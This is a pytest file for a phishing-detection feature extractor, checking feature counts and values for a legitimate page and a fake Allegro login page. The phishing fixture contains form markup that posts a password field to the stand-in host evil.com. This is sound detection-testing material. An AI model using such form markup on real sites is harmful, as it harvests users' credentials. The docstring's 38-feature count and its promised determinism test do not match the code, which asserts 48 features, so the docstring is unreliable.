"""
Unit Tests for FeatureExtractor and Feature Vector Generation.

Tests:
1. Canonical feature vector dimension (exactly 38 features)
2. Feature dictionary keys match FEATURE_NAMES exactly
3. Legitimate website feature values
4. Phishing website feature values (brand mismatch, form actions, numeric sequences)
5. Empty / missing AnalysisData graceful defaults
6. Deterministic feature vector generation
"""

import numpy as np
import pytest

from src.feature_extractor import FeatureExtractor, FEATURE_NAMES
from src.models import (
    AnalysisData,
    NetworkData,
    DOMData,
    JavaScriptData,
    VisualData,
    SSLData,
)
from src.domain_analyzer import DomainAnalyzer
from src.brand_detector import BrandDetector


@pytest.fixture
def extractor():
    """Create FeatureExtractor instance."""
    return FeatureExtractor()


class TestFeatureExtractor:
    """Test suite for FeatureExtractor operations."""

    def test_feature_vector_dimension(self, extractor):
        """Feature vector must have shape (48,) matching FEATURE_NAMES."""
        vec = extractor.extract_feature_vector(url="https://example.com")
        assert isinstance(vec, np.ndarray)
        assert vec.shape == (48,)
        assert vec.dtype == np.float32

    def test_feature_dict_keys_match_feature_names(self, extractor):
        """Feature dictionary keys must exactly match FEATURE_NAMES."""
        f_dict = extractor.extract_features_dict(url="https://www.google.com")
        assert isinstance(f_dict, dict)
        assert set(f_dict.keys()) == set(FEATURE_NAMES)
        assert len(f_dict) == len(FEATURE_NAMES)

    def test_legitimate_website_features(self, extractor):
        """Legitimate website features must correctly reflect authentic properties."""
        url = "https://www.google.com"
        dom = DOMData(
            html_content="<html><head><title>Google</title></head><body><h1>Google</h1></body></html>",
            structure_metrics={"element_count": 150, "form_count": 1, "password_input_count": 0},
        )
        ssl = SSLData(issuer="CN=Google Trust Services", expiration_date="2028-01-01T00:00:00Z", chain_valid=True)
        data = AnalysisData(dom=dom, ssl=ssl)

        f_dict = extractor.extract_features_dict(data=data, url=url)

        assert f_dict["is_https"] == 1.0
        assert f_dict["brand_detected"] == 1.0
        assert f_dict["brand_domain_match"] == 1.0
        assert f_dict["brand_domain_mismatch"] == 0.0
        assert f_dict["ssl_chain_valid"] == 1.0
        assert f_dict["ssl_recognized_ca"] == 1.0
        assert f_dict["password_input_count"] == 0.0

    def test_phishing_website_features(self, extractor):
        """Phishing website features must capture impersonation, credential harvesting, and numeric sequences."""
        url = "http://allegro.oferta7678678564.pl/login"
        dom = DOMData(
            html_content="<html><head><title>Allegro - Logowanie</title></head><body><form action='https://evil.com/post'><input type='password'></form></body></html>",
            structure_metrics={
                "element_count": 80,
                "form_count": 1,
                "password_input_count": 1,
                "email_input_count": 1,
                "login_keyword_count": 2,
                "cross_domain_form_action_count": 1,
            },
        )
        ssl = SSLData(issuer="Let's Encrypt Authority X3", expiration_date="2027-01-01T00:00:00Z", chain_valid=True)
        data = AnalysisData(dom=dom, ssl=ssl)

        f_dict = extractor.extract_features_dict(data=data, url=url)

        assert f_dict["brand_detected"] == 1.0
        assert f_dict["brand_domain_match"] == 0.0
        assert f_dict["brand_domain_mismatch"] == 1.0
        assert f_dict["password_input_count"] == 1.0
        assert f_dict["has_credential_harvesting_form"] == 1.0
        assert f_dict["cross_domain_form_action_count"] == 1.0
        assert f_dict["longest_numeric_sequence"] >= 10.0

    def test_empty_analysis_data_defaults(self, extractor):
        """Extraction with None data must return valid default numerical values."""
        f_dict = extractor.extract_features_dict(data=None, url=None)
        assert isinstance(f_dict, dict)
        assert len(f_dict) == len(FEATURE_NAMES)
        for val in f_dict.values():
            assert isinstance(val, float)
            assert not np.isnan(val)
            assert not np.isinf(val)
